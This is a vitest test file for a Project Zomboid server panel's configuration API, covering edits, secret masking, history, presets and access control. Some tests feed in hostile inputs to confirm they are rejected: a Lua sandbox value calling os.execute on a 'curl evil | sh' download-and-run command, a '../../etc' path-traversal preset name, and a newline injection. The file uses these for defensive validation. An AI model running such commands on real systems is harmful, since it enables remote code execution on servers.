import { copyFileSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { getPath, iniToRecord, parseIni, parseLuaData } from '@gsp/formats';
import { MASK } from '../src/config/service';
import { Client, fakeStatus, makePanel, ownerReady, type TestPanel } from './harness';

const fixtures = fileURLToPath(new URL('../../../fixtures/pz/b42/config/', import.meta.url));

async function setup(opts: { withFiles?: boolean } = { withFiles: true }) {
  const p = await makePanel();
  const dir = path.join(p.deps.env.pzDataDir, 'Server');
  if (opts.withFiles) {
    mkdirSync(dir, { recursive: true });
    copyFileSync(path.join(fixtures, 'server.en.ini'), path.join(dir, 'zomboid.ini'));
    copyFileSync(path.join(fixtures, 'SandboxVars.en.lua'), path.join(dir, 'zomboid_SandboxVars.lua'));
    copyFileSync(path.join(fixtures, 'spawnregions.lua'), path.join(dir, 'zomboid_spawnregions.lua'));
  }
  const { client } = await ownerReady(p);
  return { p, c: client, dir };
}

/** Where the game keeps a server file (`Server/<name><suffix>`), read directly by these tests. */
const serverFile = (p: TestPanel, suffix: string) => path.join(p.deps.env.pzDataDir, 'Server', `${p.deps.env.serverName}${suffix}`);
const ini = (p: TestPanel) => iniToRecord(parseIni(readFileSync(serverFile(p, '.ini'), 'utf8')));

/** A form save: propose the key changes, then apply them (what the web does after its preview). */
async function save(c: Client, fileId: string, changes: Record<string, unknown>) {
  const proposed = await c.post('/api/config/proposals', { fileId, changes });
  if (proposed.statusCode !== 200) return proposed;
  const { id } = proposed.json() as { id: string | null };
  return id ? c.post(`/api/config/proposals/${id}/apply`) : proposed;
}

describe('server settings (ini)', () => {
  it('reads values with secrets masked', async () => {
    const { c } = await setup();
    const r = (await c.get('/api/config/values?id=ini')).json() as { values: Record<string, string>; missing: boolean; sha256: string };
    expect(r.missing).toBe(false);
    expect(r.values.PVP).toBe('true');
    expect(r.values.RCONPassword).toBe(MASK);
    expect(r.values.Password).toBe('');
    expect(r.sha256).toMatch(/^[0-9a-f]{64}$/);
  });

  it('edits values in place and keeps an untouched secret', async () => {
    const { p, c } = await setup();
    await save(c, 'ini', { Password: 'unirse-2026' });
    const r = await save(c, 'ini', { PVP: 'false', MaxPlayers: '16', Password: MASK });
    expect(r.json()).toMatchObject({ applied: 'next-start', warnings: [], restartNeeded: false, changedKeys: ['PVP'] });
    expect(ini(p)).toMatchObject({ PVP: 'false', MaxPlayers: '16', Password: 'unirse-2026', RCONPassword: '<RCON_PASSWORD>' });
    // The audit log names the keys, never the values.
    const audit = p.deps.audit.list({ action: 'config.apply' });
    expect(audit).toHaveLength(2);
    expect(audit.map((a) => a.detail).join()).not.toContain('unirse-2026');
    expect(audit[1]!.detail).toContain('Password');
  });

  it('validates against the bilingual metadata and refuses managed or unknown keys', async () => {
    const { c } = await setup();
    const r = await c.post('/api/config/proposals', { fileId: 'ini', changes: { SafetyToggleTimer: '5000', PVP: 'maybe', RCONPort: '1', Nope: '1', PublicName: 'x\ny' } });
    expect(r.statusCode).toBe(400);
    expect(r.json()).toMatchObject({
      error: 'invalid-options',
      fields: { SafetyToggleTimer: 'must be at most 1000', PVP: 'must be true or false', RCONPort: 'managed', Nope: 'unknown-option', PublicName: 'must be a single line' },
    });
  });

  it('applies live on a running server and reports options the game rejected (CFG-05)', async () => {
    const { p, c } = await setup();
    p.feed.status_ = fakeStatus({ state: 'running' });
    p.agent.command = async (cmd) => {
      p.agent.calls.push(`command:${cmd}`);
      // What 42.20.4 logs for a value it can't parse.
      p.feed.emit({ type: 'log', stream: 'out', line: 'LOG  : General      f:0 st:1> ERROR IntegerConfigOption.parse() "ChatMessageSlowModeTime" string="abc"' });
      return { via: 'rcon', output: '' };
    };
    const proposed = (await c.post('/api/config/proposals', { fileId: 'ini', changes: { PVP: 'false', PublicName: 'Zombies Jatisheados' } })).json() as { id: string; applies: string };
    expect(proposed.applies).toBe('restart');
    const r = (await c.post(`/api/config/proposals/${proposed.id}/apply`)).json() as { applied: string; warnings: string[]; restartNeeded: boolean };
    expect(p.agent.calls).toContain('command:reloadoptions');
    expect(r).toMatchObject({ applied: 'live', warnings: ['ChatMessageSlowModeTime: abc'], restartNeeded: true });
    expect((await c.get('/api/config/pending')).json()).toMatchObject({ reasons: ['PublicName'] });
    // A live-only change says so before it is applied.
    expect(((await c.post('/api/config/proposals', { fileId: 'ini', changes: { PauseEmpty: 'true' } })).json() as { applies: string }).applies).toBe('live');
  });

  it('refuses writes while the server is booting, and the proposal waits', async () => {
    const { p, c } = await setup();
    const { id } = (await c.post('/api/config/proposals', { fileId: 'ini', changes: { PVP: 'false' } })).json() as { id: string };
    p.feed.status_ = fakeStatus({ state: 'starting' });
    expect((await c.post(`/api/config/proposals/${id}/apply`)).json()).toEqual({ error: 'server-busy' });
    p.feed.status_ = fakeStatus({ state: 'stopped' });
    expect((await c.post(`/api/config/proposals/${id}/apply`)).statusCode).toBe(200);
    expect(ini(p).PVP).toBe('false');
  });

  it('puts managed keys back on raw edits, says why, and masks secrets in the text (CFG-04, CFG-08)', async () => {
    const { p, c } = await setup();
    const content = (await c.get('/api/config/files/content?id=ini')).json() as { text: string; sha256: string; managedKeys: string[]; readonlyReason: string | null; format: string; highlight: string };
    expect(content).toMatchObject({ format: 'ini', highlight: 'properties', readonlyReason: null });
    expect(content.managedKeys).toContain('DefaultPort');
    expect(content.text).toContain(`RCONPassword=${MASK}`);
    expect(content.text).not.toContain('<RCON_PASSWORD>');
    const edited = content.text.replace('PVP=true', 'PVP=false').replace('DefaultPort=16261', 'DefaultPort=1');
    const proposed = (await c.post('/api/config/proposals', { fileId: 'ini', text: edited, baseSha256: content.sha256 })).json() as { id: string; reapplied: unknown[]; diff: unknown[] };
    expect(proposed.reapplied).toEqual([
      { key: 'DefaultPort', value: '16261', why: 'managed' },
      { key: 'UPnP', value: 'false', why: 'set-by-panel' },
    ]);
    const applied = (await c.post(`/api/config/proposals/${proposed.id}/apply`)).json();
    expect(applied).toMatchObject({ applied: 'next-start', changedKeys: ['PVP', 'UPnP'] });
    expect(ini(p)).toMatchObject({ PVP: 'false', DefaultPort: '16261', UPnP: 'false', RCONPassword: '<RCON_PASSWORD>' });
    // The game's comments stay (CFG-09).
    expect(readFileSync(serverFile(p, '.ini'), 'utf8')).toContain('# Players can hurt and kill other players');
  });

  it('seeds a first-run ini before the first start', async () => {
    const { p, c } = await setup({ withFiles: false });
    expect((await c.get('/api/config/values?id=ini')).json()).toEqual({ values: {}, missing: true, sha256: null });
    await c.post('/api/server/start');
    await p.deps.ops.idle();
    expect(ini(p)).toEqual({ SaveWorldEveryMinutes: '10' });
    expect(p.deps.config.historyOf('ini').map((h) => h.note)).toEqual(['first-run defaults']);
  });

  it('keeps working for the services that call the store directly', async () => {
    const { p } = await setup();
    const config = p.deps.config;
    expect(config.getIni().values.RCONPassword).toBe(MASK);
    await config.setDirect('ini', { Mods: 'modA;modB' }, null, 'mod list');
    expect(ini(p).Mods).toBe('modA;modB');
    expect(config.read('ini')).toContain('Mods=modA;modB');
    expect(await config.applyIni({ PVP: 'false' }, 'alice')).toEqual({ applied: 'next-start', warnings: [], restartNeeded: false });
    expect(config.applySandbox({ Zombies: 2 }, 'alice')).toEqual({ applied: 'next-start', warnings: [], restartNeeded: false });
    expect(await config.putLuaRaw('spawnregions', 'function SpawnRegions() return {} end', 'alice')).toMatchObject({ applied: 'next-start' });
    await expect(config.putLuaRaw('sandbox', 'SandboxVars = { a = os.exit() }', 'alice')).rejects.toThrow(/invalid-file/);
    expect(config.getIniRaw()).toContain(`RCONPassword=${MASK}`);
    expect(config.iniMeta().length).toBe(144);
    expect(config.sandboxMeta().length).toBeGreaterThan(200);
  });
});

describe('sandbox', () => {
  it('reads and edits nested options by path', async () => {
    const { p, c } = await setup();
    const r = (await c.get('/api/config/values?id=sandbox')).json() as { values: Record<string, unknown> };
    expect(r.values['ZombieLore.Speed']).toBe(4);
    const put = await save(c, 'sandbox', { 'ZombieLore.Speed': 1, 'Map.AllowMiniMap': true, 'MultiplierConfig.Global': 2.5 });
    expect(put.statusCode).toBe(200);
    const f = parseLuaData(readFileSync(serverFile(p, '_SandboxVars.lua'), 'utf8'));
    expect(getPath(f.table, 'ZombieLore.Speed')!.value).toMatchObject({ value: 1 });
    expect(getPath(f.table, 'MultiplierConfig.Global')!.value).toMatchObject({ raw: '2.5' });
    expect((await save(c, 'sandbox', { 'ZombieLore.Speed': 9 })).json()).toMatchObject({ fields: { 'ZombieLore.Speed': 'is not one of the allowed choices' } });
  });

  it('rejects raw Lua that is not plain data, and a Lua file of the wrong shape (CFG-02)', async () => {
    const { p, c } = await setup();
    const before = readFileSync(serverFile(p, '_SandboxVars.lua'), 'utf8');
    const evil = 'SandboxVars = {\n  Zombies = os.execute("curl evil | sh"),\n}';
    const r = await c.post('/api/config/proposals', { fileId: 'sandbox', text: evil });
    expect(r.statusCode).toBe(400);
    expect(r.json()).toMatchObject({ error: 'invalid-file', issues: [{ line: 2, col: 15, message: 'Unexpected character "."' }] });
    expect((await c.post('/api/config/proposals', { fileId: 'spawnregions', text: 'SandboxVars = {}' })).json()).toMatchObject({
      error: 'invalid-file',
      issues: [{ message: expect.stringMatching(/function SpawnRegions\(\) return/) }],
    });
    expect(readFileSync(serverFile(p, '_SandboxVars.lua'), 'utf8')).toBe(before);
    expect((await c.get('/api/config/proposals')).json()).toEqual([]);
  });

  it('applies a game preset onto the options the file has (CFG-06)', async () => {
    const { p, c } = await setup();
    const presetDir = path.join(p.deps.env.pzInstallDir, 'media', 'lua', 'shared', 'Sandbox');
    mkdirSync(presetDir, { recursive: true });
    writeFileSync(path.join(presetDir, 'Apocalypse.lua'), 'return {\n    Version = 6,\n    Zombies = 1,\n    NotAnOption = 3,\n    ZombieLore = { Speed = 3, },\n}\n');
    expect((await c.get('/api/config/meta')).json()).toMatchObject({ presets: ['Apocalypse'], presetFile: 'sandbox' });
    const proposed = (await c.post('/api/config/proposals', { fileId: 'sandbox', preset: 'Apocalypse' })).json() as { id: string; changedKeys: string[]; applies: string };
    expect(proposed).toMatchObject({ changedKeys: ['Zombies', 'ZombieLore.Speed'], applies: 'restart' });
    await c.post(`/api/config/proposals/${proposed.id}/apply`);
    const v = ((await c.get('/api/config/values?id=sandbox')).json() as { values: Record<string, unknown> }).values;
    expect(v).toMatchObject({ Zombies: 1, 'ZombieLore.Speed': 3 });
    expect(p.deps.config.historyOf('sandbox')[0]!.note).toBe('preset Apocalypse');
    expect((await c.post('/api/config/proposals', { fileId: 'sandbox', preset: '../../etc' })).statusCode).toBe(404);
    // A preset only applies to the file the adapter names.
    expect((await c.post('/api/config/proposals', { fileId: 'ini', preset: 'Apocalypse' })).statusCode).toBe(404);
    // The path the reset flow uses.
    expect(await p.deps.config.presets()).toEqual(['Apocalypse']);
    expect(await p.deps.config.applyPreset('Apocalypse', null, { force: true })).toMatchObject({ applied: 'unchanged', applied_keys: 2 });
  });
});

describe('history (CFG-03)', () => {
  it('records every change and reverts one, masking secrets in the view', async () => {
    const { p, c } = await setup();
    await save(c, 'ini', { PVP: 'false' });
    await save(c, 'ini', { MaxPlayers: '8' });
    const h = (await c.get('/api/config/history?file=ini')).json() as { id: number; note: string; username: string | null }[];
    // The pre-existing file is captured before the first panel edit.
    expect(h.map((x) => x.note)).toEqual(['changed MaxPlayers', 'changed PVP', 'on disk before this change']);
    const v = (await c.get(`/api/config/history/${h[0]!.id}`)).json() as { content: string; previous: string };
    expect(v.content).toContain(`RCONPassword=${MASK}`);
    expect(v.previous).toContain('MaxPlayers=16');
    await c.post(`/api/config/history/${h[1]!.id}/revert`);
    expect(ini(p)).toMatchObject({ PVP: 'false', MaxPlayers: '16', RCONPassword: '<RCON_PASSWORD>' });
  });

  it('previews a revert as a proposal with its diff', async () => {
    const { p, c } = await setup();
    await save(c, 'ini', { PVP: 'false' });
    const [latest, original] = (await c.get('/api/config/history?file=ini')).json() as { id: number }[];
    expect(latest).toBeDefined();
    const proposed = (await c.post('/api/config/proposals', { fileId: 'ini', revert: original!.id })).json() as { id: string; changedKeys: string[]; diff: ({ kind: string; text: string } | null)[] };
    // Going back to the file as the game wrote it would turn UPnP on again: the panel keeps it off.
    expect(proposed.changedKeys).toEqual(['PVP']);
    expect(proposed.diff.filter((l) => l && l.kind !== 'same')).toEqual([
      { kind: 'del', text: 'PVP=false' },
      { kind: 'add', text: 'PVP=true' },
    ]);
    await c.post(`/api/config/proposals/${proposed.id}/apply`);
    expect(ini(p).PVP).toBe('true');
    expect(p.deps.config.historyOf('ini')[0]!.note).toBe(`revert to version ${original!.id}`);
    expect((await c.post('/api/config/proposals', { fileId: 'sandbox', revert: original!.id })).statusCode).toBe(404);
  });

  it('is admin-only', async () => {
    const { p, c } = await setup();
    await c.post('/api/users', { username: 'op1', password: 'Temporal-12345', role: 'operator' });
    const op = new Client(p.app);
    await op.post('/api/auth/login', { username: 'op1', password: 'Temporal-12345' });
    await op.post('/api/auth/password', { current: 'Temporal-12345', next: 'Operador-propio-1' });
    for (const url of ['/api/config/values?id=ini', '/api/config/meta', '/api/config/files', '/api/config/history?file=ini', '/api/config/proposals']) expect((await op.get(url)).statusCode, url).toBe(403);
    expect((await op.post('/api/config/proposals', { fileId: 'ini', changes: { PVP: 'false' } })).statusCode).toBe(403);
    expect((await op.get('/api/config/pending')).statusCode).toBe(200);
  });

  it('the raw routes are gone', async () => {
    const { c } = await setup();
    for (const f of ['server', 'sandbox', 'spawnregions', 'spawnpoints']) expect((await c.get(`/api/config/${f}/raw`)).statusCode).toBe(404);
  });
});
